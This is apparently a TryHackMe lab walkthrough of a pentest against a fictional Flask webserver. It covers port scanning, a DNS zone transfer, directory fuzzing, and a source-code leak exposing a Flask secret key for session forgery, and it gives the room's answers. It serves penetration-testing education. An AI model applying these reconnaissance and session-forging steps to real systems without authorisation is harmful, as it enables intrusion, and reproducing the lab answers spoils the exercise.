# Hip Flask 

![image](https://user-images.githubusercontent.com/5285547/132726387-9ff991d7-a6c3-456b-9e61-e9f5dc182a7a.png)

Room Link: https://tryhackme.com/room/hipflask

## Task 1

Introduction Deploy! (deply the machine)

## Task 2

### Introduction Outline

Hip Flask is a beginner to intermediate level walkthrough. It aims to provide an in-depth analysis of the thought-processes involved in attacking an exposed webserver hosting a custom application in a penetration testing context.

Specifically, this room will look at exploiting a Python Flask application via two very distinctive flaws to gain remote code execution on the server. A simple privilege escalation will then be carried out resulting in full root access over the target.

The tasks in this room will cover every step of the attack process in detail, including providing possible remediations for the vulnerabilities found.  There are no explicit pre-requisites to cover before attempting this room; however, further resources will be linked at relevant sections should you wish further practice with the topic in question. That said, knowledge of Python and basic hacking fundamentals will come in handy. When in doubt: research!

Firefox is highly recommended for the web portion of this room. Use a different browser if you like, but be warned that any and all troubleshooting notes will be aimed at Firefox.

## Task 3

### Procedure Scoping

Before beginning an engagement, it is vitally important that both sides are completely clear about what will happen, and when it will happen. This effectively amounts to the client providing the pentester(s) with a list of targets, things to look out for, things to avoid, and any other relevant information about the assignment. In turn, the assessing team will establish whether the client's request is possible to fulfil, then either work with the client to find a more suitable scope or move on to arrange a period of time when the testing will be carried out. Additionally, the pentesters will also provide the client with the IP addresses the attacks will be coming from.

This process is referred to as "scoping".

Aside from the scoping meetings, the client will also provide the testing team with a point of contact in the company. This person will work with the team to some extent throughout the testing. In many cases this may simply be the person to reach out to should something go wrong; in other cases there may be daily, or even hourly reporting to this individual.

There are various types of penetration tests, and various methodologies with which these tests can be carried out. These methodologies can be placed on a sliding scale between black box and white box, with grey box in the middle. In a purely black box penetration test the assessing team will be given no information about the targets, aside from addresses or an address range to attack. In extreme cases the attackers may be given little more than the company name and be forced to determine the addresses for themselves. In short, the attackers start with no prior information and have to perform initial enumeration for themselves from the same starting position as a bad actor (a malicious hacker, or group of hackers, attacking the target without permission). This is good from a realism perspective, however, pentests are expensive and many companies do not wish to pay the assessors to sit around and perform initial footprinting of the organisation.

At the opposite end of the spectrum is white box penetration testing. As expected, in a white box penetration test, the attackers are given all relevant information about the target(s), which they can review in order to find vulnerabilities based on prior security knowledge and experience.

Most common are grey box tests where only some of the relevant information is provided by the client. The amount disclosed is dependent on the client and the target, meaning that a grey box test could fall anywhere on a sliding scale between white and black box tests.

The most common types of penetration test are web application and network pentests.

Web application penetration testing revolves (as the name would suggest) around searching for vulnerabilities in web applications. In this style of assessment, the scope would provide the pentesters with a webapp (or multiple webapps) to work with. In a white box webapp pentest, the source code for the application would usually also be disclosed. Assessors would then attempt to find vulnerabilities in the application(s) over a period of time; often following a methodology such as that outlined in the OWASP Testing Guide.
Network pentests (often called Infrastructure pentests) can be further split into two categories: internal and external.
External network pentests are when the client provides a public-facing endpoint (such as a VPN server or firewall) and asks the pentesters to assess it from the outside. Should the assessors succeed in gaining access, a further consultation with the client would be required to discuss an extension of the scope to include internal targets.
Internal network pentests usually involve a pentester physically going to the client and attacking the network from on-site, although remote internal pentests where companies give the pentester remote access to a machine in the network (e.g. via VPN) are growing in popularity. These are relatively common as companies often want to test their active directory infrastructure. This kind of assessment is frequently grey box and starts from a position of assumed compromise. In other words, the attackers are provided with a low-privileged account with which they can start to poke around the network and see what they can use to escalate their privileges over the domain.
The scope for this room is as follows:


There is one target: 10.10.69.83. This is the client's public-facing webserver.
The machine is a cloned copy of the client's production server. Every service running on the machine is in scope.
The target is hosted privately by the client at their headquarters. The target is owned entirely by the client. The client has the requisite authority to commission testing on the target.
No further information will be given about the target.
Assessors should attempt to find any and all vulnerabilities in the server, then report back to the client: Hip Flasks Ltd.


The client is the "Hip Flasks Ltd" company.

Note: this company is fictional and should not bear any resemblance to any real-world organisations now or in the future. Anything not on the TryHackMe network is absolutely out of scope.

- Question

Answer the questions below

Is the network portion internal or external?

```
external
```

## Task 4

### Procedure Common Vulnerability Scoring System (CVSS)

When a vulnerability is found in a target, there needs to be a standardised way of evaluating and judging the severity of vulnerabilities. Cue: CVSS.

The Common Vulnerability Scoring System is an open framework originally developed by the United States National Infrastructure Advisory Council (NIAC). It has since passed into the care of the Forum of Incident Response and Security Teams (FIRST); a global collaborative who have been maintaining the system since 2005. The short version is: the CVSS scoring system gives us a common method for calculating vulnerability scores which we can then share with a client. At the time of writing we are on version 3.1 of the scoring system.

The system works by giving the assessor a variety of options to do with the impact (working with the CIA triad: Confidentiality, Integrity, and Availability) and accessibility of the exploit (i.e. how easy it is to pull off), which it then uses to calculate a base score. When it comes to CVEs (Common Vulnerabilities and Exposures) -- one of the main standardised ways of disclosing vulnerabilities found in non-custom software and devices) -- the final score is adjusted over time depending on other factors, such as whether there is exploit code publicly available, and whether there are patches released for the exploit. This is referred to as temporal scoring. Exploits in custom applications tend to be a little more hit-and-miss with this scoring system, however, it is still very possible to use CVSS for these.

![image](https://user-images.githubusercontent.com/5285547/132727990-1ab8dd54-0fe0-4147-995d-4484c457100c.png)

## Task 5

### Enumeration Outline

With the scope planned out, the day of the engagement is upon us!

It's time to start the testing. In hacking (as with everything), information is power. The more we know about the target, the more options we have available to us; thus we start with various kinds of enumeration.

We would often start with a passive footprinting stage before beginning the active enumeration that you may be familiar with. This would be time spent performing gathering OSINT (Open-Source Intelligence) about the target from their online footprint. For example, we may look for public email addresses, employee names, interesting subdomains / subdirectories in websites, Github repositories, or anything else that is publicly available and may come in handy. Tools like TheHarvester and the Recon-ng framework may come in handy for this.

If this room was designed to be a full course then there would be publicly available information to scavenge for our fictional target company; however, as this is just a taster for the methodology (and a more in-depth introduction to some of the techniques later on!), we will skip the footprinting stage and assume that there is no public footprint to find. Instead we will start by enumerating the target server directly.

Fortunately we only have one target, so getting an initial idea of what we're dealing with technically speaking should be fairly simple. We'll start with a few port scans against the target to see what we're up against, then move on to some more probing vulnerability scans, followed by enumerating the available services in-depth.

## Task 6

### Enumeration Port Scanning

If you have done any of the boxes on TryHackMe then you should already be comfortable with portscanning.

What you may be less comfortable with is port scanning safely. In CTFs it is all too common to see people running Rustscan, or nmap with the -T5 and/or -A switches active. This is all well and good in a lab environment, but is less likely to go well in the real world. In reality, fast and furious enumeration is much more likely to damage a target unnecessarily (the point can be made that if a server is unable to stand up to a port scanner then it isn't fit for purpose, but do you really want to explain to the client and your boss why the company website has gone down?). The mantra "slow and steady wins the race", comes to mind. Realistically, in today's world anything other than a small, slow, home-brew port scanner will be picked up by most intrusion detection systems very quickly indeed; however, we may as well minimise our own footprint as much as possible.

Quick scans with a small scope can be used to get an initial idea of what's available. Slower scans with a larger scope can then be run in the background whilst you look into the results from the initial scans. The goal should be to always have something running in the background whilst you focus on something else ( a philosophy which shouldn't just apply to initial enumeration).

With that in mind, let's start some scans against the target. If you are not familiar with Nmap already, now would be a good time to complete the Nmap room.

Before we start scanning properly, try pinging the target. You should find that it doesn't respond to ICMP echo packets (i.e. pings timeout against it):

![image](https://user-images.githubusercontent.com/5285547/132728370-cbd3c99f-3c7e-4596-b95e-389709e972e3.png)

We know that the target is active, so this tells us that there is a firewall between us and the target -- a finding well worth bearing in mind as we progress with the assessment.

Time for some Nmap scans.

First and foremost, let's do a quick TCP SYN scan against the top 1000 most common TCP ports on the target. If not already running as root, we will do this with ```sudo``` so that we can use a SYN "Stealth" scan (which is default for the root user):
```sudo nmap -vv 10.10.69.83 -oN Initial-SYN-Scan```

We use ```-oN``` to write the results of this to a file in normal format. It is good practice to always save the results of our scans -- this means that we can refer to them later, and never need to repeat a scan.

Against this target, we should get four ports returned:

![image](https://user-images.githubusercontent.com/5285547/132728539-7db4ae88-d352-4263-9805-9355f79b6caf.png)

![image](https://user-images.githubusercontent.com/5285547/132728583-4b98d629-6638-4254-bd42-465e035ba82d.png)

---

Next, let's perform a service scan on these four ports, just to confirm that we are correct with the services:

![image](https://user-images.githubusercontent.com/5285547/132728635-15be6025-5325-4f30-877e-6b980e203590.png)

With the service scan we have identified OpenSSH version 8.2p1 for Ubuntu. Checking the Ubuntu package list tells us that this version currently only ships with Ubuntu Focal -- in other words, Ubuntu 20.04 LTS. Whilst this fingerprint could technically be spoofed, it is a good thing to note down regardless as the chances of this are low.

Port 53 has clearly had its fingerprint tampered with -- this is easy to do, and is often done in an attempt to obscure the version of the service. Given we know that this machine is very likely to be Linux, we can guess that the DNS server installed is most likely (statistically speaking) to be BIND (Berkeley Internet Name Domain). If this is the case then (despite the lack of an accurate fingerprint) we can also infer that the server version is at least 8.2, as this is when the option to change the banner was introduced. This is unfortunate, as before this point there were also a few serious vulnerabilities with this software.

Identifying the webserver as Nginx doesn't help us much, but again is useful to note down.

Already we have a pretty good idea of what might be happening with this server. Whilst a lot of what we just covered is guesswork based on most common software deployments, it's still useful to put it down tentatively as a working point, to be changed if contradicted later on.

---

Next let's perform a UDP scan on the target. UDP scans are notoriously slow, inaccurate, and inconsistent, so we won't spend a lot of time here. We do want to confirm that port 53 is open, so let's tell Nmap to scan the top 50 most common UDP ports and tell us which ones it thinks are open.

We get four results, only one of which is definitive:

![image](https://user-images.githubusercontent.com/5285547/132728701-00e27222-00c4-4aba-abba-71b76399fe22.png)

Much like the filtered response from a TCP scan referring to a firewall in play, the open|filtered response in a UDP scan indicates a possible firewall. As the scan indicates, the three ports showing this state provided no response to the scan. This could mean that there is a firewall preventing access to the ports, or it could mean that the ports are open and just don't return a response (as is frequently the case with UDP). In short, UDP scans are not very accurate, but we have confirmed that UDP/53 is open.

To summarise, based on initial information, we know for sure that there are three services running: SSH on TCP port 22, DNS on TCP and UDP ports 53 (with a modified banner), and HTTP(S) on TCP ports 80 and 443.

This is enough to be getting on with for now.

We will move on from here; however, as a matter of good practice you should run a full port scan on a slower mode (e.g. -T2) against the TCP ports, and maybe a slightly wider UDP scan in the background. Be warned: these will not return anything new for this box.


## Task 7

### Enumeration Vulnerability Scanning

With the initial enumeration done, let's have a look at some vulnerability scanning.

We could keep using Nmap for this (making use of the NSE -- Nmap Scripting Engine); or we could do the more common thing and switch to an industry-standard vulnerability scanner: Nessus.

Vulnerability scanners are used to scan a target (or usually a wide range of targets across a client network), checking for vulnerabilities against a central database. They will usually provide a list of discovered vulnerabilities, ranked from critical down to low or informational, with options to filter the results and export them into a report. There are a variety of vulnerability scanners available, including the opensource OpenVAS framework, however, Nessus is one of the most popular vulnerability scanners currently available when it comes to industry usage. Both OpenVas and Nessus have TryHackMe rooms dedicated to them already, so we will keep this section relatively short.

---

Unfortunately, due to licensing it is not possible to provide a machine with Nessus pre-installed. If you want to follow along with this section then you will need to download and install Nessus Essentials (the free version) for yourself. This is a relatively straight-forward process (which is covered in detail in the Nessus room), however, it can take quite a while! Nessus Essentials limits you significantly compared to the very expensive professional versions; however, it will do for our purposes here. This task is not essential to complete the room, so feel free to just read the information here if you would prefer not to follow along yourself.

The short version of the installation process is:

- Create a new Ubuntu VM (Desktop or Server, or another distro entirely). 40Gb hard disk space, 4Gb of RAM and 2 VCPUs worked well locally; however, you could probably get away with slightly less processing power for what we are using Nessus for here. A full list of official hardware requirements are detailed here, although again, these assume that you are using Nessus professionally.  
- With the VM installed, go to the Nessus downloads page and grab an appropriate installer. For Ubuntu, Debian, or any other Debian derivatives, you are looking for a ```.deb``` file that matches up with your VM version (searching the page for the VM name and version -- e.g. "Ubuntu 20.04" -- can be effective here). Read and accept the license agreement, then download the file to your VM.  
- Open a terminal and navigate to where you downloaded the package to. Install it with ```sudo apt install ./PACKAGE_NAME```.  
- This should install the Nessus server. You will need to start the server manually; this can be done with: ```sudo systemctl enable --now nessusd```. This will permanently enable the Nessus daemon, allowing it to start with the VM, opening a web interface on ```https://LOCAL_VM_IP:8834```.  
- Navigate to the web interface and follow the instructions there, making sure to select Nessus Essentials when asked for the version. You will need a (free) activation code to use the server; this should be emailed directly from the server web interface. If that doesn't work then you can manually obtain an activation code from here.  
- Allow the program some time to finish setting up, then create a username and password when prompted, and login!  
---

We already have a target with 5 confirmed open ports, so let's get scanning it!

Before configuring the scan, make sure that your Nessus VM is connected to the TryHackMe network, either with your own VPN config file (disconnected from any other machines) or with a separate config file from another account.

With that done, we can start scanning.

Clicking "New Scan" in the top right corner leads us to a "Scan Templates" interface. From here we select "Advanced Scan"

![image](https://user-images.githubusercontent.com/5285547/132729555-199b5a82-f028-47ad-99b0-d7f3375b2566.png)

Fill in a name and a description of your choosing, then add the IP address of the target (10.10.69.83) to the targets list:

![image](https://user-images.githubusercontent.com/5285547/132729581-4636bc51-24ba-43de-bd01-0b6f259dcb1f.png)

After setting the target, switch tabs to Discovery -> Host Discovery in the Settings menu for the scan and disable the "Ping the remote host" option. As previously established, this machine does not respond to ICMP echo packets, so there's no point in pinging it to see if it's up.

Next we head to Discovery -> Port Scanning in the Settings menu for the scan. Here we can tell Nessus to only scan the ports which we already found to be open:

![image](https://user-images.githubusercontent.com/5285547/132729617-6281adeb-0d31-4ae2-8b7c-841f0b72f2e9.png)

At the bottom of the page we can now choose to save (or directly launch) the scan. Click the dropdown at the right hand side of the "Save" button and launch the scan.

The scan will take a few minutes to complete, and (at the time of writing) return two medium vulnerabilities, one low vulnerability, and 42 information disclosures. Clicking on the scan name from the "My Scans" interface will give us an overview of the findings:

![image](https://user-images.githubusercontent.com/5285547/132729639-c639da34-ed44-42bc-8b32-bf1255d7f846.png)

As it happens, none of the findings are particularly useful to us in terms of exploiting the target further (both medium vulnerabilities being to do with the self-signed SSL cert for the server, and the low vulnerability relating to a weak cipher enabled on SSH); however, they would definitely be worth reporting to the client. Notice that the scores are given based on the CVSSv3 system.

We could run some more targeted scans, but otherwise we have now done all we can with Nessus at this stage. It may come in handy later on, should we find any SSH credentials, however.
---

Vulnerabilities:

![image](https://user-images.githubusercontent.com/5285547/132729714-1597d7e2-058f-4d36-996f-7136b9d6ae7c.png)

## Task 8

### Enumeration Web App: Initial Thoughts

Of the three services available, the webserver is the one most likely to have vulnerabilities that Nessus couldn't find. As the client has not asked us to focus specifically on the webapp, but rather on the server as a whole, we will not do a deep-dive analysis on the website(s) being served by the webserver. We can always discuss adding a full web application pentest to the scope with the client later on.

Nginx is easy to misconfigure, and any custom webapps on the server could potentially have vulnerabilities that Nessus is unable to detect. At this point we don't know if Nginx is being used as a reverse proxy, or if it has its PHP engine installed and enabled.

Only one way to find out!

Navigating to the target IP address in Firefox gives us a message:

```
Host Name: 10.10.69.83, not found.
This server hosts sites on the hipflasks.thm domain.
```

This is the same for both the HTTP and HTTPS versions of the page.

Aside from the overly verbose error message (which in itself is unnecessary information exposure and should be rectified), we also learn that the client's domain appears to be ```hipflasks.thm```. This is something we would likely already have known had we footprinted the client before starting the assessment. Additionally, we now know that the server expects a specific server name to be provided -- likely ```hipflasks.thm``` or a subdomain of it.

Testing for common subdomains is complicated considerably by the fact that this is not really a public webserver. The common solution in a CTF would be to just use the ```/etc/hosts``` file on Unix systems, or the  ```C:\Windows\System32\drivers\etc\hosts``` file on Windows, but this will become a collosal pain if there are lots of virtual hosts on the target. Instead, let's make use of the DNS server installed on the target.

Editing the system-wide DNS servers for a split-tunnel VPN connection like the one used for TryHackMe is, frankly, a colossal pain in the rear end. Fortunately there is an easier "hack" version using the FireFox config settings. This will only allow FireFox to use the DNS server, but right now that's all we need.

- Navigate to ```about:config``` in the FireFox search bar and accept the risk notice.
- Search for ```network.dns.forceResolve```, double click it and set the value to the IP address of the target machine, then click the tick button to save the setting:

![image](https://user-images.githubusercontent.com/5285547/132730021-d7f4c804-5fad-47c3-ac02-129709ca02a4.png)

Note: You will need to replace this with your own Machine IP!

## Task 9

### Enumeration DNS

We still don't actually know exactly what DNS server is in use here; however, there are very few current vulnerabilities in Linux DNS servers, so the chances are that if there's something to be found, it will be a misconfiguration.

Fortunately for us, misconfigurations in DNS are notoriously easy to make.

As the address system of the internet, it need not be said how important DNS is. As a result of this importance, it is good practice to have at least two DNS servers containing the records for a "zone" (or domain, in normal terms). This means that if one server goes down, there is still at least one other which contains the records for the domain; but this poses a problem: how do you update DNS records for the zone without having to go and update every server manually? The answer is something called a "Zone Transfer". In short: one server is set up as the "master" (or primary) DNS server. This server contains the primary records for the zone. In BIND9, zone configuration files for a primary server look something like this:

![image](https://user-images.githubusercontent.com/5285547/132730346-5c0af254-24b5-45ae-8698-891a451f301f.png)


This defines a master zone for the ```domain example.com```, it tells BIND to read the records from a file called ```/etc/bind/db.examples.com``` and accept queries from anywhere. Crucially, it also allows zone transfers to an IP address: ```172.16.0.2```.

In addition to the primary DNS server, one or more "slave" (or secondary) DNS servers are set up. They would have a zone file looking like this:

![image](https://user-images.githubusercontent.com/5285547/132730452-9c9f2363-0af2-425b-b433-e5f8e43ad317.png)

This defines a slave zone, setting the IP address of the primary DNS server in the ```masters {};``` directive.

So, what are zone transfers? As you may have guessed, zone transfers allow secondary DNS servers to replicate the records for a zone from a primary DNS server. At frequent intervals (controlled by the Time To Live value of the zone), the secondary server(s) will query a serial number for the zone from the primary server. If the number is greater than the number that the secondary server(s) have stored for the zone then they will initiate a zone transfer, requesting all of the records that the primary server holds for that zone and making a copy locally.
In some configurations a "DNS Notify List" may also exist on the primary DNS server. If this is in place then the primary server will notify all of the secondary servers whenever a change is made, instructing them to request a zone transfer.

How can we weaponize this? Well, what happens if any of the servers don't specify which IP addresses are allowed to request a zone transfer? What if a DNS server has an entry in the zone config which looks like this: ```allow-transfer { any; };```?

Rather than specifying a specific IP address (or set of IP addresses), the server allows any remote machine to request all of the records for the zone. Believe it or not, this misconfiguration is even easier to make in the Windows GUI DNS service manager.

This means that if the server is configured incorrectly we may be able to dump every record for the domain -- including the subdomains that we are looking for here!

Zone transfers are initiated by sending the target DNS server an ```axfr``` query. This can be done in a variety of ways, however, on Linux it is easiest to use either the ```dig``` or ```host``` commands:

```dig axfr hipflasks.thm @10.10.69.83```
or
```host -t axfr hipflasks.thm 10.10.69.83```

If the server is misconfigured to allow zone transfers from inappropriate places then both of these commands will return the same results, albeit formatted slightly differently. Namely a dump of every record in the zone.

![image](https://user-images.githubusercontent.com/5285547/132730686-956a9891-a3b6-4afa-a95d-d0eb4023a523.png)

- Question

Attempt a zone transfer against the hipflasks.thm domain.

What subdomain hosts the webapp we're looking for?

```
hipper
```

Command: 

```
dig axfr hipflasks.thm @10.10.69.83
```

## Task 10

### Enumeration Web App Fingerprinting and Enumeration

We already modified our FireFox configuration earlier to send all of our traffic to the target, so we should already be able to access that site on ```https://hipper.hipflasks.thm```. That said, the configuration change we made previously (while very good for poking around an unknown webserver), can become annoying very quickly, so now may be a good time to reverse it and just add ```hipper.hipflasks.thm``` to your hosts file.

Note: As this target is not actually connected to the internet, you will need to accept the self-signed certificate by going to Advanced -> Accept in the warning page that pops up.

Having a look around the page and in the source code, there don't appear to be any working links, so if we want to access other pages then we will need to look for them ourselves. Of course, directory listing is disabled, which makes this slightly harder.

The source code does indicate the presence of ```assets/, assets/img/, css/, and js/``` subdirectories, which seem to contain all of the static assets in use on the page:

![image](https://user-images.githubusercontent.com/5285547/132731736-2cf7bc23-d875-491a-a9cf-1f4f2b3ce897.png)

Nothing ground breaking so far, but we can start to build up a map of the application from what he have here:

```
/
|__assets/
|____imgs/
|____fonts/
|__css/
|__js/
```
---

With the initial looking around out of the way, let's have a look at the server itself. The Wappalyzer browser extension is a good way to do this, or, alternatively, we could just look at the server headers in either the browser dev tools or Burpsuite. Intercepting a request to https://hipper.hipflasks.thm/ in Burpsuite, we can right-click and choose to Do Intercept -> Response to this request:

![image](https://user-images.githubusercontent.com/5285547/132731874-60300440-5e46-4ad3-ad51-602ee943c05a.png)

We should now receive the response headers from the server:

![image](https://user-images.githubusercontent.com/5285547/132731933-e947421b-20d1-480b-9a5b-ff9dab82488f.png)

A few things stand out here. First of all, the server header: ```waitress```. This would normally be Nginx, as we already know from the TCP fingerprint that this is the webserver in use. This means that we are dealing with a reverse proxy to a waitress server. A quick Google search for "waitress web app" tells us that Waitress is a production-ready Python WSGI server -- in other words, we are most likely dealing with either a Django or a Flask webapp, these being the most popular Python web-development frameworks.

Secondly, there are various security-headers in play here -- however, notably absent are the ```Content-Security-Policy``` and ```X-XSS-Protection headers```, meaning that the site may be vulnerable to XSS, should we find a suitable input field. Equally, the HSTS (Http Strict Transport Security) header which should usually force a HTTPS connection won't actually be doing anything here due to the self-signed certificate.

Before we go any further, let's start a couple of scans to run in the background while we look around manually. Specifically, let's go for Nikto and Feroxbuster (or Gobuster, if you prefer). Running in parallel (assuming you updated your hosts file):
```nikto --url https://hipper.hipflasks.thm | tee nikto```
and
```feroxbuster -t 10 -u https://hipper.hipflasks.thm -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -x py,html,txt -o feroxbuster```

This will start a regular Nikto scan saving into a file called "nikto", as well as a feroxbuster directory fuzzing scan using 10 threads (```-t 10```) to make sure we don't overload anything, ignoring the self-signed SSL cert (```-k```), using the seclists common.txt wordlist (```-w /usr/share/seclists/Discovery/Web-Content/common.txt```), checking for three extensions (```-x py,html,txt```), and saving into an output file called "feroxbuster".

If one of these switches seems odd to you, don't worry -- it should! We'll come on to this in the next task...

With those scans started, let's move on and quickly see what we can find manually in the SSL cert, before the scan results come in.
---

SSL certificates often provide a veritable treasure trove of information about a company. In Firefox the certificate for a site can be accessed by clicking on the lock to the left of the search bar, then clicking on the Show Connection Details arrow, making sure to deactivate your Burpsuite connection first!

Note: You may get an error about Strict Transport Security if you try to access the site having previously accessed it using Burpsuite. This is due to the Burpsuite (signed) certificate allowing the browser to accept the aforementioned HSTS header, meaning that it will no longer accept the self-signed certificate  The solution to this in Firefox is to open your History (Ctrl + H), find the ```hipper.hipflasks.thm``` domain, right click it, then select "Forget about this site". You should be able to reload the page normally.

![image](https://user-images.githubusercontent.com/5285547/132732194-137569ab-a20b-43d4-ae78-b83668f4f10f.png)

Next click on "More Information", then "View Certificate" in the Window which pops up.

A new tab will open containing the certificate information for this domain.

![image](https://user-images.githubusercontent.com/5285547/132732222-36367660-6858-449b-a073-9b2e0b1ae0fa.png)

Unfortunately there isn't a lot here that we either don't already know, or would already have known had we footprinted the company.

Still, checking the SSL certificate is a really good habit to get into.
---

Let's switch back and take a look at the results of our scans.

Nikto:

The Nikto webapp scanner is fairly rudimentary, but it often does a wonderful job of catching low-hanging fruit:

![image](https://user-images.githubusercontent.com/5285547/132732302-a2036133-76f8-4b86-ba5c-7c0821583e2b.png)

There's a bit to break down here. First of all, the certificate information looks fine -- the cipher is current at the time of writing and we already knew the rest. We already spotted the lack of X-XSS-Protection header whilst we were waiting for the scan to complete, and identified that there was an Nginx reverse proxy in play.

The session cookie being created without the Secure flag is interesting though -- this means that the cookie could potentially be sent over unencrypted HTTP connections. This is something we can (and should) report to the client.

Finally, the BREACH vulnerability picked up by Nikto appears to be a false positive.

Feroxbuster:

This is the interesting one.

```
308        4l       24w      274c https://hipper.hipflasks.thm/admin
200       37l       81w      862c https://hipper.hipflasks.thm/main.py
```

We have an admin section, and what appears to be source code disclosure.

If we cURL that main.py file then we get a pleasant surprise:

![image](https://user-images.githubusercontent.com/5285547/132732386-7b8ec640-20bd-4d40-9190-d852fcaf8557.png)

First, we have just established that this application is written in Flask (although there was actually a way we could have done this without the source code disclosure -- see if you can figure out how! It may become a little more obvious in later tasks). Secondly, we have the app's secret key. Due to the way that Flask creates its sessions, this is an incredibly serious vulnerability, as you will see in upcoming tasks...

Note: This key is autogenerated every time the box starts, so don't be alarmed that it won't be the same for your instance of the machine.

![image](https://user-images.githubusercontent.com/5285547/132732440-cbf87e33-9ba7-4699-98ef-5e4df7596b7f.png)

- Question

Answer the questions below
Disclose the source code for the ```main.py``` file and note down the secret key.

```
e64402685ec842717a86898aa4e3c962
```

Command: 

```
curl https://hipper.hipflasks.thm/main.py -k
```

## Task 11

### Web App Understanding the Vulnerability

The critical vulnerability that we just discovered will effectively allow us to forge sessions for any user we wish, but before we get into exploiting it, touching on how it happened might be helpful. This also explains that unusual switch in the feroxbuster scan which was mentioned previously.

This task is not necessary to complete the room, so if you're not interested in how the vulnerability occurred then you may skip ahead to the next task

Web apps traditionally follow the same structure as the underlying file-system. For example, with a PHP web application, the root directory of the webserver would contain a file called index.php, and usually a few subdirectories related to different functions. There might then be a subdirectory called about/, which would also contain an index.php. The index files are used to indicate the default content for that directory, meaning that if you tried to access https://example.com/, then the webserver would likely actually be reading a file called /var/www/html/index.php. Accessing https://example.com/about/, would be reading /var/www/html/about/index.php from the filesystem.

This approach makes life very easy for us as hackers -- if a file is under the webroot (/var/www/html by default for Apache on Linux) then we will be able to access it from the webserver.

Modern webapps are often not like this though -- they follow a design structure called "routing". Instead of the routes being defined by the structure of the file system, the routes are coded into the webapp itself. Accessing https://example.com/about/ in a routed web app would be a result of a program running on the webserver (written in something like Python -- like our target application here -- NodeJS or Golang) deciding what page you were trying to access, then either serving a static file, or generating a dynamic result and displaying it to you. This approach practically eliminates the possibility of file upload vulnerabilities leading to remote code execution, and means that we can only access routes that have been explicitly defined. It's also a lot neater than the traditional approach from an organisational perspective.

There is a downside to routing, however. Serving static content such as CSS or front-end Javascript can be very tedious if you have to define a route for each page. Additionally, it's also relatively slow to have your webapp handling the static content for you (although most frameworks do have the option to serve a directory). As such, it's very common to have a webapp sitting behind a reverse proxy such as Nginx or Caddy. The webserver handles the static content, and any requests that don't match the ruleset defined for static content get forwarded to the webapp, which then sends the response back through the proxy to the user.

What this means is that searching for file extensions in a route fuzzing attempt (like the Feroxbuster scan we ran) won't actually do anything with a routed application, unless the reverse proxy has been misconfigured to serve more static content than it's supposed to. Unfortunately, it is very easy to mess up the configuration for a reverse proxy, for example, this common Nginx configuration could potentially leak the full source code for the webapp -- a very dangerous prospect:

![image](https://user-images.githubusercontent.com/5285547/132732928-cf1d180d-5710-4135-bfe5-755eeb79993a.png)

![image](https://user-images.githubusercontent.com/5285547/132732960-922ad702-609d-420f-9a83-219bc41ea888.png)


## Task 12

### Web App Full Source Code Disclosure

We've already found a potentially serious vulnerability in this application, which we will look at exploiting soon.

For the mean time, let's focus on gathering more information about the application; using our discovered file to grab the rest of the code seems like a good start. Flask applications work by having one main file (which we already have). This file then imports everything else that the application needs to run -- for example, blueprints that map out other parts of the app, authentication modules, etc.

This means that we don't need to do any more fuzzing to find the rest of the source code: we can just read what the main.py file is importing and pull on the metaphorical thread until we have all of the files downloaded. Whenever we find a new file, we should download a copy locally using the curl -o FILENAME switch so that we can review the source code in detail later.

Let's start by looking at what the main.py file is importing:

![image](https://user-images.githubusercontent.com/5285547/132734339-49301e06-3c2e-4911-bdb3-b449b9adbf81.png)

![image](https://user-images.githubusercontent.com/5285547/132734379-4a90dbdd-7da8-4884-b092-c2a17c7062a8.png)

![image](https://user-images.githubusercontent.com/5285547/132734423-69a82636-4c6e-4d1f-bf07-ee6463bb988f.png)

![image](https://user-images.githubusercontent.com/5285547/132734479-a0fd5bcc-3ef8-4639-b1bc-eefe928d4e7d.png)

![image](https://user-images.githubusercontent.com/5285547/132734514-3f2cc477-1508-4eab-89c1-7e8712bb9fb2.png)

![image](https://user-images.githubusercontent.com/5285547/132734541-0ec49c95-5148-47d3-9c5a-7f8b2ebf3282.png)

![image](https://user-images.githubusercontent.com/5285547/132734593-5785346c-e581-4745-b711-eb307cd7edee.png)


## Task 13

### Web App Implications of the Vulnerability

We now have local copies of all of the Python files making up the application, so let's take a look through them. We are aiming to exploit the token forgery vulnerability we found earlier, so this is a good time to talk about how Flask sessions work.

Because HTTP(S) is inherently stateless, websites store information which needs to persist between requests in cookies -- tiny little pieces of information stored on your computer. Unfortunately, this also poses a problem: if the information is stored on your computer, what's stopping you from just editing it? When it comes to sessions, there are two mainstream solutions.
Sessions are a special type of cookie -- they identify you to the website and need to be secure. Sessions usually hold more information than just a single value (unlike a standard cookie where there may only be a single value stored for each index). For example, if you are logged into a website then your session may contain your user ID, privilege levels, full name, etc. It's a lot quicker to store these things in the session than it is to constantly query the database for them!

So, how do we keep sessions secure? There are two common schools of thought when it comes to session storage:

- Server Side Session Storage:- store the session information on the server, but give the client a cookie to identify it.
This is the method which PHP and most other traditional languages use. Effectively, when a session is created for a client (i.e. a visitor to the site), the client is given a cookie with a unique identifier, but none of the session information is actually handed over to the client. Instead the server stores the session information in a file locally, identified by the same unique ID. When the client makes a request, the server reads the ID and selects the correct file from the disk, reading the information from it. This is secure because there is no way for the client to edit the actual session data (so there is no way for them to elevate their privileges, for example).
There are other forms of server side session storage (e.g. storing the data in a Redis or memcached server rather than on disk), but the principle is always the same.

- Client Side Session Storage:- store all of the session information in the client's cookies, but encrypt or sign it to ensure that it can't be tampered with.
In a client side session storage situation, all of the session values are stored directly within the cookie -- usually in something like a JSON Web Token (JWT). This is the method that Flask uses. The cookie is sent off with each request as normal and is read by the server, exactly as with any other cookie -- only with an extra layer of security added in. By either signing or encrypting the cookie with a private secret known only to the server, the cookie in theory cannot be modified. Flask signs its cookies, which means we can actually decode them without requiring the key (for a demonstration, try putting your session cookie from the target website into a base64 decoder such as the one here) -- we just can't edit them... unless we have the key.

There are advantages and disadvantages to both methods. Server side session storage is practically more secure and requires less data being sent to-and-from the server. Client side session storage makes it easier to scale the application up across numerous servers, but is limited by the 4Kb storage space allowed per cookie. Importantly, it is also completely insecure if the private key is disclosed. Whether the framework signs the cookie (leaving it in plaintext, but verifying it to ensure that tampering is impossible), or outright encrypts the cookie, it's game over if that private key gets leaked.

Anyone in possession of the webapp's private key is able to create (i.e. forge) new cookies which will be trusted by the application. If we understand how the authentication system works then we can easily forge ourselves a cookie with any values we want -- including making ourselves an administrator, or any number of other fun applications.

In short, an application which relies on client-side sessions and has a compromised private key is royally done for. Checkmate.

Time to go bake some cookies!

## Task 14

### Web App Source Code Review

